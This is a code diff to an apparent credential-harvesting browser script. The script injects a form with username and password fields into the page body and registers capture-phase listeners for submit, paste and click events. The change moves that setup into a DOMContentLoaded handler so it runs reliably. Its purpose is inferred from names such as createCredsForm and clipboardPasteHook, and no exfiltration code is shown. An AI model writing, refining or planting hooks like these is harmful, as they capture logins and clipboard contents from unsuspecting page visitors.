@@ -43,7 +43,7 @@ function createCredsForm() {
     addInputElement("user", "text");
     addInputElement("pass", "password");
 
-    document.getElementsByTagName("body")[0].appendChild(formElem);
+    document.body.appendChild(formElem);
 
     return formElem;
 }
@@ -118,8 +118,11 @@ function clickHook(e) {
     document.removeEventListener("click", clickHook);
 }
 
-var credsFormElem = createCredsForm();
-document.addEventListener("submit", submitHook, true);
-document.addEventListener("paste", clipboardPasteHook, true);
-document.addEventListener("click", clickHook)    
+var credsFormElem
+document.addEventListener("DOMContentLoaded", function(event){
+    credsFormElem = createCredsForm();
+    document.addEventListener("submit", submitHook, true);
+    document.addEventListener("paste", clipboardPasteHook, true);
+    document.addEventListener("click", clickHook)
+});
 
